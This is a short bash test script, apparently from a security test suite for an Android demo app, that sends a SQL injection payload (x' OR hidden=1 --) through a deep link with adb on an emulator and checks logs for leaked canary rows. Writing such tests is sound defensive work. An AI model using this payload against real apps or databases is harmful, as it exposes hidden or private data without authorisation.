#!/usr/bin/env bash
# Threat 2 (SPEC section 2): SQL injection through a deep link parameter. EMULATOR ONLY. adb alone.
cd "$(dirname "$0")" && . ./_common.sh
echo "== t2a: SQL injection via ?q= (threat 2) =="
require_emulator; require_victim
reset_state
# q = x' OR hidden=1 --   (percent-encoded; the payload does not contain the canary)
URI="https://shezguard.example/search?q=x%27%20OR%20hidden%3D1%20--"
echo "ATTACK: open $URI in the demo app."
send "am start -a android.intent.action.VIEW -c android.intent.category.BROWSABLE -d '$URI' $VICTIM"
echo "LOOK FOR: 'ShezDemo ... results=[... CANARY-HIDDEN-ROW-...]' (hidden rows returned)."
verdict "ShezDemo.*CANARY-HIDDEN-ROW" "$VICTIM/\.demo\.SearchActivity"
